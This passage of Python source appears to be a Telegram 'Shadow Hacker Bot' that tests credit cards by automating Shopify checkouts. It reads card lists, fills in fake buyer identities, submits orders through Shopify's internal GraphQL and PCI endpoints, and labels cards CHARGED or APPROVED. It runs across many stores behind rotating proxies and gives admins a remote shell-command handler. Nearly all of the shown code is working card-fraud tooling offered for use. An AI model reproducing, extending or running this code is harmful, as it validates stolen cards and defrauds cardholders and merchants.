                    "postalCode": "{addr.postal_code}",
                    "firstName": "{addr.first_name}",
                    "lastName": "{addr.last_name}",
                    "zoneCode": "{addr.zone_code}",
                    "phone": "{addr.phone}"
                  }}
                }},
                "cardSource": null
              }},
              "giftCardPaymentMethod": null,
              "redeemablePaymentMethod": null,
              "walletPaymentMethod": null,
              "walletsPlatformPaymentMethod": null,
              "localPaymentMethod": null,
              "paymentOnDeliveryMethod": null,
              "paymentOnDeliveryMethod2": null,
              "manualPaymentMethod": null,
              "customPaymentMethod": null,
              "offsitePaymentMethod": null,
              "customOnsitePaymentMethod": null,
              "deferredPaymentMethod": null,
              "customerCreditCardPaymentMethod": null,
              "paypalBillingAgreementPaymentMethod": null,
              "remotePaymentInstrument": null
            }},
            "amount": {{
              "value": {{
                "amount": "{total_amount}",
                "currencyCode": "USD"
              }}
            }}
          }}
        ],
        "billingAddress": {{
          "streetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}"
          }}
        }}
      }},
      "buyerIdentity": {{
        "customer": {{
          "presentmentCurrency": "USD",
          "countryCode": "US"
        }},
        "email": "{email}",
        "emailChanged": false,
        "phoneCountryCode": "US",
        "marketingConsent": [],
        "shopPayOptInPhone": {{"countryCode": "US"}},
        "rememberMe": false
      }},
      "tip": {{"tipLines": []}},
      "taxes": {{
        "proposedAllocations": null,
        "proposedTotalAmount": {{"any": true}},
        "proposedTotalIncludedAmount": null,
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      }},
      "note": {{
        "message": null,
        "customAttributes": []
      }},
      "localizationExtension": {{"fields": []}},
      "nonNegotiableTerms": null,
      "scriptFingerprint": {{
        "signature": null,
        "signatureUuid": null,
        "lineItemScriptChanges": [],
        "paymentScriptChanges": [],
        "shippingScriptChanges": []
      }},
      "optionalDuties": {{"buyerRefusesDuties": false}},
      "cartMetafields": []
    }},
    "attemptToken": "{attempt_token}",
    "metafields": [],
    "analytics": {{
      "requestUrl": "{checkout_url}",
      "pageId": "{page_id}"
    }}
  }},
  "operationName": "SubmitForCompletion",
  "id": "{submit_id}"
}}'''
            
            gql_payload = self.patch_payload(gql_payload, currency, country)
            
            headers = {
                "accept": "application/json",
                "accept-language": "en-US",
                "content-type": "application/json",
                "origin": shop_url,
                "referer": checkout_url,
                "shopify-checkout-client": "checkout-web/1.0",
                "shopify-checkout-source": f'id="{checkout_token}", type="cn"',
                "x-checkout-one-session-token": session_token,
                "x-checkout-web-build-id": build_id,
                "x-checkout-web-deploy-stage": "production",
                "x-checkout-web-server-handling": "fast",
                "x-checkout-web-server-rendering": "yes",
                "x-checkout-web-source-id": source_token
            }
            
            resp = session.post(f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
                               data=gql_payload, headers=headers)
            return resp.status_code, resp.text
        except Exception as e:
            return 500, str(e)
        finally:
            session.close()
    
    def send_poll_for_receipt(self, shop_url: str, checkout_url: str, checkout_token: str,
                              session_token: str, build_id: str, source_token: str,
                              poll_id: str, receipt_id: str, receipt_session_token: str) -> Tuple[int, str]:
        
        session = self._get_session()
        try:
            vars_json = json.dumps({
                "receiptId": receipt_id,
                "sessionToken": receipt_session_token
            })
            params = {
                "operationName": "PollForReceipt",
                "variables": vars_json,
                "id": poll_id
            }
            full_url = f"{shop_url}/checkouts/internal/graphql/persisted?{urllib.parse.urlencode(params)}"
            
            headers = {
                "accept": "application/json",
                "accept-language": "en-US",
                "content-type": "application/json",
                "referer": checkout_url,
                "shopify-checkout-client": "checkout-web/1.0",
                "shopify-checkout-source": f'id="{checkout_token}", type="cn"',
                "x-checkout-one-session-token": session_token,
                "x-checkout-web-build-id": build_id,
                "x-checkout-web-deploy-stage": "production",
                "x-checkout-web-server-handling": "fast",
                "x-checkout-web-server-rendering": "yes",
                "x-checkout-web-source-id": checkout_token
            }
            
            resp = session.get(full_url, headers=headers)
            return resp.status_code, resp.text
        except Exception as e:
            return 500, str(e)
        finally:
            session.close()
    
    def run_checkout(self, shop_url: str, card_data: str) -> CheckResult:
        """Execute the full Shopify checkout flow."""
        result = CheckResult(card=card_data, shop_url=shop_url, status=CheckStatus.ERROR)
        site_name = shop_url.replace("https://", "").replace("http://", "")
        result.site_name = site_name
        
        try:
            parts = card_data.strip().split('|')
            if len(parts) != 4:
                result.error = Exception("Invalid card format")
                return result
            card_number, card_month, card_year, card_cvv = parts[0], int(parts[1]), int(parts[2]), parts[3]
        except Exception as e:
            result.error = e
            return result
        
        email = self.generate_email()
        currency = "USD"
        country = "US"
        
        try:
            # Step 0: Find cheapest product
            product_title, product_id, variant_id, price = self.find_cheapest_product(shop_url)
            if not variant_id:
                result.error = Exception("No available products found")
                result.retryable = True
                return result
            
            # Step 1: Add to cart and get checkout
            checkout_url, checkout_token, session_token, checkout_html = self.add_to_cart_and_checkout(shop_url, variant_id)
            if not checkout_url:
                result.error = Exception("Failed to reach checkout")
                result.retryable = True
                return result
            
            stable_id = self.extract_stable_id(checkout_html)
            build_id = self.extract_commit_sha(checkout_html)
            source_token = self.extract_source_token(checkout_html)
            if not stable_id or not build_id or not source_token:
                result.error = Exception("Missing stableId, buildId, or sourceToken")
                result.retryable = True
                return result
            
            # Step 2: Get private access token
            pat_id = self.extract_private_access_token_id(checkout_html)
            if not pat_id:
                result.error = Exception("Could not extract private_access_token id")
                result.retryable = True
                return result
            
            # Step 3: Get actions JS and extract IDs
            actions_url = ""
            match = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)', checkout_html)
            if match:
                actions_url = shop_url + match.group(1)
            
            if not actions_url:
                result.error = Exception("Could not find actions JS URL")
                result.retryable = True
                return result
            
            # Fetch actions JS
            session = self._get_session()
            try:
                js_resp = session.get(actions_url, headers={"Origin": shop_url}, timeout=30)
                if js_resp.status_code != 200:
                    result.error = Exception(f"Actions JS returned {js_resp.status_code}")
                    result.retryable = True
                    session.close()
                    return result
                js_body = js_resp.text
            finally:
                session.close()
            
            proposal_id = self.extract_proposal_id(js_body)
            submit_id = self.extract_submit_id(js_body)
            poll_for_receipt_id = "2db3246fa83390126a41952b21af3b97985d62dc7a45cb102d9e4b8784372e6a"
            
            if not proposal_id or not submit_id:
                result.error = Exception("Missing Proposal or Submit ID")
                result.retryable = True
                return result
            
            # Step 4: First proposal
            status, proposal_body = self.send_proposal(shop_url, checkout_url, checkout_token, session_token,
                                                       stable_id, variant_id, price, proposal_id, build_id,
                                                       source_token, currency, country)
            if status != 200:
                result.error = Exception(f"Proposal 1 failed with status {status}")
                result.retryable = True
                return result
            
            cur = self.extract_seller_currency(proposal_body)
            if cur and cur != currency:
                currency = cur
            ctr = self.extract_seller_country(proposal_body)
            if ctr and ctr != country:
                country = ctr
            result.currency = currency
            
            queue_token = self.extract_queue_token(proposal_body)
            if not queue_token:
                result.error = Exception("Could not extract queueToken from proposal 1")
                return result
            
            # Step 5: Second proposal with email
            status, proposal2_body = self.send_proposal2(shop_url, checkout_url, checkout_token, session_token,
                                                         stable_id, variant_id, price, proposal_id, build_id,
                                                         source_token, queue_token, email, currency, country)
            if status != 200:
                result.error = Exception(f"Proposal 2 failed with status {status}")
                result.retryable = True
                return result
            
            queue_token2 = self.extract_queue_token(proposal2_body)
            if not queue_token2:
                result.error = Exception("Could not extract queueToken from proposal 2")
                return result
            
            # Step 6: Third proposal with address
            addr = self.address_for_country(country)
            status, proposal3_body = self.send_proposal3(shop_url, checkout_url, checkout_token, session_token,
                                                         stable_id, variant_id, price, proposal_id, build_id,
                                                         source_token, queue_token2, email, addr, currency, country)
            if status != 200:
                result.error = Exception(f"Proposal 3 failed with status {status}")
                result.retryable = True
                return result
            
            queue_token3 = self.extract_queue_token(proposal3_body)
            if not queue_token3:
                result.error = Exception("Could not extract queueToken from proposal 3")
                return result
            
            # Step 7: Fourth proposal (repeat)
            time.sleep(random.uniform(0.1, 0.3))
            status, proposal4_body = self.send_proposal3(shop_url, checkout_url, checkout_token, session_token,
                                                         stable_id, variant_id, price, proposal_id, build_id,
                                                         source_token, queue_token3, email, addr, currency, country)
            if status != 200:
                result.error = Exception(f"Proposal 4 failed with status {status}")
                result.retryable = True
                return result
            
            queue_token4 = self.extract_queue_token(proposal4_body)
            if not queue_token4:
                result.error = Exception("Could not extract queueToken from proposal 4")
                return result
            
            # Step 8: Fifth proposal
            time.sleep(random.uniform(0.1, 0.3))
            status, proposal5_body = self.send_proposal3(shop_url, checkout_url, checkout_token, session_token,
                                                         stable_id, variant_id, price, proposal_id, build_id,
                                                         source_token, queue_token4, email, addr, currency, country)
            if status != 200:
                result.error = Exception(f"Proposal 5 failed with status {status}")
                result.retryable = True
                return result
            
            # Step 9: PCI Session
            ident_sig = self.extract_identification_signature(checkout_html)
            if not ident_sig:
                result.error = Exception("Could not extract identification signature")
                return result
            
            pci_status, pci_body = self.send_pci_session(ident_sig, card_number, f"{addr.first_name} {addr.last_name}",
                                                         card_month, card_year, card_cvv, site_name)
            if pci_status != 200:
                result.error = Exception(f"PCI session failed with status {pci_status}")
                return result
            
            pci_session_id = self.extract_pci_session_id(pci_body)
            if not pci_session_id:
                result.error = Exception("Could not extract PCI session ID")
                return result
            
            # Step 10: Submit for completion
            queue_token5 = self.extract_queue_token(proposal5_body)
            if not queue_token5:
                result.error = Exception("Could not extract queueToken from proposal 5")
                return result
            
            delivery_handle = self.extract_delivery_handle(proposal5_body)
            if not delivery_handle:
                result.error = Exception("Could not extract delivery handle")
                result.retryable = True
                return result
            
            signed_handles = self.extract_signed_handles(proposal5_body)
            if not signed_handles:
                result.error = Exception("Could not extract signed handles")
                result.retryable = True
                return result
            
            shipping_amount = self.extract_shipping_amount(proposal5_body)
            total_amount = self.extract_checkout_total(proposal5_body)
            if not total_amount:
                result.error = Exception("Could not extract total amount")
                return result
            result.amount = total_amount
            
            attempt_token = self.generate_attempt_token(checkout_token)
            submit_status, submit_body = self.send_submit_for_completion(
                shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, submit_id, build_id, source_token, queue_token5,
                email, addr, delivery_handle, shipping_amount, total_amount,
                pci_session_id, attempt_token, currency, country, signed_handles
            )
            
            receipt_id = self.extract_receipt_id(submit_body)
            if not receipt_id:
                error_msg = self.extract_any_error(submit_body)
                if error_msg:
                    result.status_code = error_msg
                    result.error = Exception(error_msg)
                    result.retryable = any(k in error_msg.lower() for k in ['inventory', 'retry', 'try again'])
                    return result
                else:
                    result.error = Exception("Could not extract receipt ID or error message")
                    result.retryable = True
                    return result
            
            receipt_session_token = self.extract_receipt_session_token(submit_body)
            if not receipt_session_token:
                result.error = Exception("Could not extract receipt session token")
                return result
            
            # Step 11: Poll for receipt
            type_name_re = re.compile(r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')
            
            for poll_num in range(1, 31):
                poll_status, poll_body = self.send_poll_for_receipt(
                    shop_url, checkout_url, checkout_token, session_token,
                    build_id, source_token, poll_for_receipt_id, receipt_id, receipt_session_token
                )
                
                receipt_type = ""
                match = type_name_re.search(poll_body)
                if match:
                    receipt_type = match.group(1)
                
                if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
                    result.status = CheckStatus.CHARGED
                    result.status_code = "ORDER_PLACED"
                    return result
                
                if receipt_type == "ActionRequiredReceipt":
                    result.status = CheckStatus.APPROVED
                    result.status_code = "3DS_AUTHENTICATION"
                    return result
                
                if receipt_type == "FailedReceipt":
                    error_code = ""
                    match = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
                    if match:
                        error_code = match.group(1)
                    
                    if error_code == "INSUFFICIENT_FUNDS":
                        result.status = CheckStatus.APPROVED
                        return result
                    elif error_code == "CAPTCHA_REQUIRED":
                        result.status = CheckStatus.DECLINED
                        result.error = Exception(f"Declined: {error_code}")
                        return result
                    else:
                        if "InventoryReservationFailure" in poll_body:
                            result.status = CheckStatus.ERROR
                            result.retryable = True
                            return result
                        result.status = CheckStatus.DECLINED
                        result.error = Exception(f"Declined: {error_code}")
                        return result
                
                # Wait for next poll
                delay = 500
                match = re.search(r'"pollDelay"\s*:\s*(\d+)', poll_body)
                if match:
                    try:
                        d = int(match.group(1))
                        if d > 0:
                            delay = d
                    except ValueError:
                        pass
                time.sleep(delay / 1000.0)
            
            result.error = Exception("Exceeded 30 poll attempts")
            return result
            
        except Exception as e:
            result.error = e
            return result

# ──────────────────────── BOT HANDLERS ─────────────────────────────

# Global state
user_sessions = {}
check_queue = deque()
check_results = []

async def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

def load_cards():
    if not os.path.exists(CARDS_PATH):
        return []
    with open(CARDS_PATH, 'r') as f:
        return [line.strip() for line in f if line.strip() and not line.startswith('#')]

def load_proxies():
    if not os.path.exists(PROXY_PATH):
        return []
    with open(PROXY_PATH, 'r') as f:
        return [line.strip() for line in f if line.strip() and not line.startswith('#')]

def load_sites():
    if not os.path.exists(SITES_PATH):
        return []
    with open(SITES_PATH, 'r') as f:
        return [line.strip() for line in f if line.strip() and not line.startswith('#')]

def add_site(site: str) -> bool:
    site = site.strip()
    if not site.startswith(('http://', 'https://')):
        site = 'https://' + site
    sites = load_sites()
    if site in sites:
        return False
    with open(SITES_PATH, 'a') as f:
        f.write(f"{site}\n")
    return True

def add_proxy(proxy: str) -> bool:
    proxy = proxy.strip()
    if '://' not in proxy:
        proxy = 'http://' + proxy
    proxies = load_proxies()
    if proxy in proxies:
        return False
    with open(PROXY_PATH, 'a') as f:
        f.write(f"{proxy}\n")
    return True

def delete_site(site: str) -> bool:
    sites = load_sites()
    if site not in sites:
        return False
    sites.remove(site)
    with open(SITES_PATH, 'w') as f:
        f.write('\n'.join(sites))
    return True

def delete_proxy(proxy: str) -> bool:
    proxies = load_proxies()
    if proxy not in proxies:
        return False
    proxies.remove(proxy)
    with open(PROXY_PATH, 'w') as f:
        f.write('\n'.join(proxies))
    return True

def check_site_status(site: str) -> dict:
    """Quickly check if a site is accessible."""
    site = site.strip()
    if not site.startswith(('http://', 'https://')):
        site = 'https://' + site
    try:
        session = requests.Session()
        session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        resp = session.get(site, timeout=10, allow_redirects=True)
        status = resp.status_code
        if status == 200:
            # Check if it's a Shopify site
            if 'shopify' in resp.text or 'myshopify.com' in site:
                return {"status": "online", "code": status, "type": "shopify"}
            return {"status": "online", "code": status, "type": "unknown"}
        return {"status": "error", "code": status, "type": "unknown"}
    except Exception as e:
        return {"status": "error", "code": str(e), "type": "unknown"}

def check_proxy_status(proxy_url: str) -> dict:
    """Quickly test if a proxy works."""
    proxy_url = proxy_url.strip()
    if '://' not in proxy_url:
        proxy_url = 'http://' + proxy_url
    try:
        session = requests.Session()
        session.proxies = {'http': proxy_url, 'https': proxy_url}
        session.timeout = 15
        resp = session.get('https://api.ipify.org?format=json', timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            return {"status": "working", "ip": data.get('ip', 'unknown'), "code": resp.status_code}
        return {"status": "error", "ip": "unknown", "code": resp.status_code}
    except Exception as e:
        return {"status": "error", "ip": "unknown", "code": str(e)}

def get_random_sites(count: int = 20) -> List[str]:
    sites = []
    try:
        resp = requests.get(WORKING_SITES_API, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if isinstance(data, list):
                sites = [item.get('url', '') for item in data if item.get('url')]
    except:
        pass
    if not sites:
        sites = load_sites()
    if not sites:
        sites = ["https://example-store.myshopify.com", "https://demo-shop.myshopify.com"]
    random.shuffle(sites)
    return sites[:count]

# ─── /start ──────────────────────────────────────────────────────────
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    user_sessions[user_id] = {"state": "main"}
    
    keyboard = [
        [InlineKeyboardButton("🔍 /sh <site> - Single", callback_data="single")],
        [InlineKeyboardButton("🚀 /msh - Multi 20 Sites", callback_data="multi")],
        [InlineKeyboardButton("📁 /mtxt - File Checker", callback_data="file")],
        [InlineKeyboardButton("📊 Dashboard", callback_data="dashboard")],
        [InlineKeyboardButton("👤 Profile", callback_data="profile")],
    ]
    if await is_admin(user_id):
        keyboard.append([InlineKeyboardButton("👑 Admin", callback_data="admin")])
        keyboard.append([InlineKeyboardButton("💻 /cmd", callback_data="cmd")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"<b>🐱 Shadow Hacker Bot v6.0 - ULTIMATE</b>\n\n"
        f"Welcome, <b>{update.effective_user.first_name}</b>!\n\n"
        f"<b>Checker Commands:</b>\n"
        f"<code>/sh &lt;site&gt;</code> - Single checkout\n"
        f"<code>/msh</code> - Check 20 random sites\n"
        f"<code>/mtxt</code> - Check sites from sites.txt\n\n"
        f"<b>Manage Sites:</b>\n"
        f"<code>/addsite &lt;url&gt;</code> - Add site\n"
        f"<code>/delsite &lt;url&gt;</code> - Remove site\n"
        f"<code>/sites</code> - List all sites\n"
        f"<code>/chksite &lt;url&gt;</code> - Check site status\n\n"
        f"<b>Manage Proxies:</b>\n"
        f"<code>/addproxy &lt;proxy&gt;</code> - Add proxy\n"
        f"<code>/delproxy &lt;proxy&gt;</code> - Remove proxy\n"
        f"<code>/proxies</code> - List all proxies\n"
        f"<code>/chkproxy &lt;proxy&gt;</code> - Check proxy status\n\n"
        f"<i>Full address database | PCI tokenization | All GQL flows</i>",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

# ─── /sh - Single Check ─────────────────────────────────────────────
async def single_check(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    args = context.args
    if not args:
        await update.message.reply_text(
            "❌ Please provide a site URL.\n"
            "Example: <code>/sh https://example.myshopify.com</code>",
            parse_mode='HTML'
        )
        return
    
    site = args[0].strip()
    if not site.startswith(('http://', 'https://')):
        site = 'https://' + site
    
    await update.message.reply_text(f"🔍 Starting single check on <b>{site}</b>...", parse_mode='HTML')
    
    cards = load_cards()
    if not cards:
        await update.message.reply_text("❌ No cards found. Add cards to test.txt")
        return
    
    card = random.choice(cards)
    
    try:
        checker = ShopifyChecker()
        result = await asyncio.get_event_loop().run_in_executor(None, checker.run_checkout, site, card)
        
        status_emoji = "✅" if result.status == CheckStatus.CHARGED else "⚠️" if result.status == CheckStatus.APPROVED else "❌" if result.status == CheckStatus.DECLINED else "🔴"
        
        await update.message.reply_text(
            f"<b>📊 Single Check Result</b>\n\n"
            f"🛒 <b>Site:</b> {result.shop_url}\n"
            f"💳 <b>Card:</b> {result.card[:10]}...\n"
            f"{status_emoji} <b>Status:</b> {result.status.name}\n"
            f"📝 <b>Code:</b> {result.status_code or 'N/A'}\n"
            f"💰 <b>Amount:</b> ${result.amount} {result.currency}\n"
            f"🌍 <b>Country:</b> {result.site_name}\n\n"
            f"<i>Time: {datetime.now().strftime('%H:%M:%S')}</i>",
            parse_mode='HTML'
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

# ─── /msh - Multi 20 Sites ──────────────────────────────────────────
async def multi_check(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("🚀 Starting multi-check on 20 random sites...")
    
    cards = load_cards()
    if not cards:
        await update.message.reply_text("❌ No cards found.")
        return
    
    sites = get_random_sites(20)
    if not sites:
        await update.message.reply_text("❌ No sites available.")
        return
    
    progress_msg = await update.message.reply_text("⏳ Processing 20 sites... 0/20")
    results = []
    completed = 0
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_site = {}
        for site in sites:
            card = random.choice(cards)
            checker = ShopifyChecker()
            future = executor.submit(checker.run_checkout, site, card)
            future_to_site[future] = site
        
        for future in concurrent.futures.as_completed(future_to_site):
            site = future_to_site[future]
            try:
                result = future.result(timeout=120)
                results.append(result)
                completed += 1
                if completed % 2 == 0 or completed == len(sites):
                    await progress_msg.edit_text(f"⏳ Processing 20 sites... {completed}/{len(sites)}")
            except Exception as e:
                results.append(CheckResult(card="", shop_url=site, status=CheckStatus.ERROR, error=e))
                completed += 1
    
    charged = sum(1 for r in results if r.status == CheckStatus.CHARGED)
    approved = sum(1 for r in results if r.status == CheckStatus.APPROVED)
    declined = sum(1 for r in results if r.status == CheckStatus.DECLINED)
    errors = sum(1 for r in results if r.status == CheckStatus.ERROR)
    
    with open(RESULTS_PATH, "a") as f:
        f.write(f"\n--- Multi Check at {datetime.now()} ---\n")
        for r in results:
            f.write(f"{r.shop_url} | {r.status.name} | {r.amount}\n")
    
    await progress_msg.edit_text(
        f"<b>📊 Multi-Check Complete!</b>\n\n"
        f"🛒 <b>Sites:</b> {len(results)}\n"
        f"✅ <b>Charged:</b> {charged}\n"
        f"⚠️ <b>Approved:</b> {approved}\n"
        f"❌ <b>Declined:</b> {declined}\n"
        f"🔴 <b>Errors:</b> {errors}\n\n"
        f"📁 Results saved to {RESULTS_PATH}",
        parse_mode='HTML'
    )

# ─── /mtxt - File Checker ────────────────────────────────────────────
async def file_check(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    sites = load_sites()
    if not sites:
        await update.message.reply_text(f"❌ No sites in <code>{SITES_PATH}</code>", parse_mode='HTML')
        return
    
    cards = load_cards()
    if not cards:
        await update.message.reply_text("❌ No cards found.")
        return
    
    await update.message.reply_text(f"📁 Starting file checker on <b>{len(sites)}</b> sites...", parse_mode='HTML')
    progress_msg = await update.message.reply_text("⏳ Starting... 0/{}".format(len(sites)))
    
    results = []
    for idx, site in enumerate(sites, 1):
        await progress_msg.edit_text(f"⏳ Checking {idx}/{len(sites)}: {site[:40]}...")
        card = random.choice(cards)
        try:
            checker = ShopifyChecker()
            result = await asyncio.get_event_loop().run_in_executor(None, checker.run_checkout, site, card)
            results.append(result)
        except Exception as e:
            results.append(CheckResult(card="", shop_url=site, status=CheckStatus.ERROR, error=e))
        await asyncio.sleep(0.3)
    
    charged = sum(1 for r in results if r.status == CheckStatus.CHARGED)
    approved = sum(1 for r in results if r.status == CheckStatus.APPROVED)
    declined = sum(1 for r in results if r.status == CheckStatus.DECLINED)
    errors = sum(1 for r in results if r.status == CheckStatus.ERROR)
    
    with open(RESULTS_PATH, "a") as f:
        f.write(f"\n--- File Check at {datetime.now()} ---\n")
        for r in results:
            f.write(f"{r.shop_url} | {r.status.name} | {r.amount}\n")
    
    await progress_msg.edit_text(
        f"<b>📊 File Check Complete!</b>\n\n"
        f"📁 <b>Sites:</b> {len(results)}\n"
        f"✅ <b>Charged:</b> {charged}\n"
        f"⚠️ <b>Approved:</b> {approved}\n"
        f"❌ <b>Declined:</b> {declined}\n"
        f"🔴 <b>Errors:</b> {errors}\n\n"
        f"📁 Results saved to {RESULTS_PATH}",
        parse_mode='HTML'
    )

# ─── /addsite ─────────────────────────────────────────────────────────
async def add_site_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    args = context.args
    if not args:
        await update.message.reply_text(
            "❌ Please provide a site URL.\n"
            "Example: <code>/addsite https://example.myshopify.com</code>",
            parse_mode='HTML'
        )
        return
    
    site = args[0].strip()
    if not site.startswith(('http://', 'https://')):
        site = 'https://' + site
    
    if add_site(site):
        await update.message.reply_text(f"✅ Added site: <code>{site}</code>", parse_mode='HTML')
    else:
        await update.message.reply_text(f"⚠️ Site already exists or invalid: <code>{site}</code>", parse_mode='HTML')

# ─── /delsite ─────────────────────────────────────────────────────────
async def del_site_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    args = context.args
    if not args:
        await update.message.reply_text(
            "❌ Please provide a site URL.\n"
            "Example: <code>/delsite https://example.myshopify.com</code>",
            parse_mode='HTML'
        )
        return
    
    site = args[0].strip()
    if not site.startswith(('http://', 'https://')):
        site = 'https://' + site
    
    if delete_site(site):
        await update.message.reply_text(f"✅ Removed site: <code>{site}</code>", parse_mode='HTML')
    else:
        await update.message.reply_text(f"❌ Site not found: <code>{site}</code>", parse_mode='HTML')

# ─── /sites ───────────────────────────────────────────────────────────
async def list_sites(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    sites = load_sites()
    if not sites:
        await update.message.reply_text("📁 No sites in sites.txt")
        return
    
    msg = f"📁 <b>Sites ({len(sites)})</b>:\n\n"
    for i, site in enumerate(sites, 1):
        msg += f"{i}. <code>{site}</code>\n"
        if len(msg) > 3500:
            msg += "\n... (truncated)"
            break
    
    await update.message.reply_text(msg, parse_mode='HTML')

# ─── /chksite ─────────────────────────────────────────────────────────
async def check_site(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    args = context.args
    if not args:
        await update.message.reply_text(
            "❌ Please provide a site URL.\n"
            "Example: <code>/chksite https://example.myshopify.com</code>",
            parse_mode='HTML'
        )
        return
    
    site = args[0].strip()
    if not site.startswith(('http://', 'https://')):
        site = 'https://' + site
    
    await update.message.reply_text(f"🔍 Checking <code>{site}</code>...", parse_mode='HTML')
    
    result = await asyncio.get_event_loop().run_in_executor(None, check_site_status, site)
    
    emoji = "✅" if result['status'] == "online" else "❌"
    await update.message.reply_text(
        f"{emoji} <b>Site Check Result</b>\n\n"
        f"🛒 <b>URL:</b> <code>{site}</code>\n"
        f"📊 <b>Status:</b> {result['status']}\n"
        f"📝 <b>Code:</b> {result['code']}\n"
        f"🔍 <b>Type:</b> {result['type']}",
        parse_mode='HTML'
    )

# ─── /addproxy ────────────────────────────────────────────────────────
async def add_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    args = context.args
    if not args:
        await update.message.reply_text(
            "❌ Please provide a proxy.\n"
            "Example: <code>/addproxy http://user:pass@host:port</code>",
            parse_mode='HTML'
        )
        return
    
    proxy = args[0].strip()
    if '://' not in proxy:
        proxy = 'http://' + proxy
    
    if add_proxy(proxy):
        await update.message.reply_text(f"✅ Added proxy: <code>{proxy}</code>", parse_mode='HTML')
    else:
        await update.message.reply_text(f"⚠️ Proxy already exists: <code>{proxy}</code>", parse_mode='HTML')

# ─── /delproxy ────────────────────────────────────────────────────────
async def del_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    args = context.args
    if not args:
        await update.message.reply_text(
            "❌ Please provide a proxy.\n"
            "Example: <code>/delproxy http://user:pass@host:port</code>",
            parse_mode='HTML'
        )
        return
    
    proxy = args[0].strip()
    if '://' not in proxy:
        proxy = 'http://' + proxy
    
    if delete_proxy(proxy):
        await update.message.reply_text(f"✅ Removed proxy: <code>{proxy}</code>", parse_mode='HTML')
    else:
        await update.message.reply_text(f"❌ Proxy not found: <code>{proxy}</code>", parse_mode='HTML')

# ─── /proxies ────────────────────────────────────────────────────────
async def list_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    proxies = load_proxies()
    if not proxies:
        await update.message.reply_text("📁 No proxies in px.txt")
        return
    
    msg = f"📁 <b>Proxies ({len(proxies)})</b>:\n\n"
    for i, proxy in enumerate(proxies, 1):
        msg += f"{i}. <code>{proxy}</code>\n"
        if len(msg) > 3500:
            msg += "\n... (truncated)"
            break
    
    await update.message.reply_text(msg, parse_mode='HTML')

# ─── /chkproxy ────────────────────────────────────────────────────────
async def check_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    args = context.args
    if not args:
        await update.message.reply_text(
            "❌ Please provide a proxy.\n"
            "Example: <code>/chkproxy http://user:pass@host:port</code>",
            parse_mode='HTML'
        )
        return
    
    proxy = args[0].strip()
    if '://' not in proxy:
        proxy = 'http://' + proxy
    
    await update.message.reply_text(f"🔍 Checking proxy <code>{proxy}</code>...", parse_mode='HTML')
    
    result = await asyncio.get_event_loop().run_in_executor(None, check_proxy_status, proxy)
    
    emoji = "✅" if result['status'] == "working" else "❌"
    await update.message.reply_text(
        f"{emoji} <b>Proxy Check Result</b>\n\n"
        f"🔄 <b>Proxy:</b> <code>{proxy}</code>\n"
        f"📊 <b>Status:</b> {result['status']}\n"
        f"🌐 <b>IP:</b> {result.get('ip', 'N/A')}\n"
        f"📝 <b>Code:</b> {result['code']}",
        parse_mode='HTML'
    )

# ─── Callback Handler ───────────────────────────────────────────────
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    data = query.data
    
    if data == "single":
        await query.edit_message_text("🔍 Use <code>/sh &lt;site&gt;</code>", parse_mode='HTML')
    elif data == "multi":
        await query.edit_message_text("🚀 Starting /msh...")
        await multi_check(update, context)
    elif data == "file":
        await query.edit_message_text("📁 Starting /mtxt...")
        await file_check(update, context)
    elif data == "dashboard":
        await query.edit_message_text("📊 Dashboard: Type /start")
    elif data == "profile":
        user = update.effective_user
        await query.edit_message_text(f"<b>👤 Profile</b>\n\nID: <code>{user.id}</code>\nName: {user.first_name}", parse_mode='HTML')
    elif data == "admin":
        if await is_admin(update.effective_user.id):
            await query.edit_message_text("👑 Admin Panel: Use /start")
        else:
            await query.edit_message_text("❌ Not authorized.")
    elif data == "cmd":
        if await is_admin(update.effective_user.id):
            await query.edit_message_text("💻 Enter a system command.")
            context.user_data['awaiting_cmd'] = True
        else:
            await query.edit_message_text("❌ Not authorized.")

# ─── Message Handler ───────────────────────────────────────────────
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    
    if context.user_data.get('awaiting_cmd') and await is_admin(user_id):
        cmd = update.message.text
        try:
            result = subprocess.run(shlex.split(cmd), capture_output=True, text=True, timeout=30)
            output = result.stdout or result.stderr or "Done."
            if len(output) > 4000:
                output = output[:4000] + "\n... (truncated)"
